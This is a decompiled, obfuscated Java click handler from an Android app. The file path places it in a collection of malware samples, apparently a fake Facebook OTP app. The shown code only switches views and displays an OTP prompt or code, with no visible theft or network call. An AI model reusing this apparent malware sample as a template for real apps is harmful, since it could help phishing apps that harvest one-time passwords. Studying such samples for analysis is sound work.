import android.content.res.Resources;
import android.view.View;
import android.widget.Adapter;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.ViewFlipper;
import com.soft360.iService.MainActivity;

public final class cE
  implements AdapterView.OnItemClickListener
{
  public cE(MainActivity paramMainActivity) {}
  
  public final void onItemClick(AdapterView paramAdapterView, View paramView, int paramInt, long paramLong)
  {
    paramView = (ViewFlipper)this.a.findViewById(2131427374);
    paramView.setInAnimation(this.a, 2130968577);
    paramView.setOutAnimation(this.a, 2130968578);
    paramAdapterView = (dT)((Adapter)paramAdapterView.getAdapter()).getItem(paramInt);
    paramAdapterView.c = MainActivity.a(this.a);
    TextView localTextView1 = (TextView)this.a.findViewById(2131427462);
    TextView localTextView2 = (TextView)this.a.findViewById(2131427463);
    Button localButton = (Button)this.a.findViewById(2131427404);
    this.a.findViewById(2131427372).setVisibility(8);
    if (paramAdapterView.c.equals(""))
    {
      localTextView1.setText(this.a.getResources().getIdentifier("template" + this.a.getString(2131165185) + "_need_generate", "string", this.a.getPackageName()));
      localButton.setVisibility(0);
      localTextView2.setVisibility(8);
      localButton.setTag(Integer.valueOf(paramInt));
    }
    for (;;)
    {
      paramView.setDisplayedChild(3);
      return;
      localButton.setVisibility(8);
      localTextView2.setVisibility(0);
      localTextView1.setText(this.a.getString(this.a.getResources().getIdentifier(new StringBuilder("template").append(this.a.getString(2131165185)).append("_valid_OTP").toString(), "string", this.a.getPackageName())) + "\n" + paramAdapterView.b);
      localTextView2.setText(paramAdapterView.c);
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/cE.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */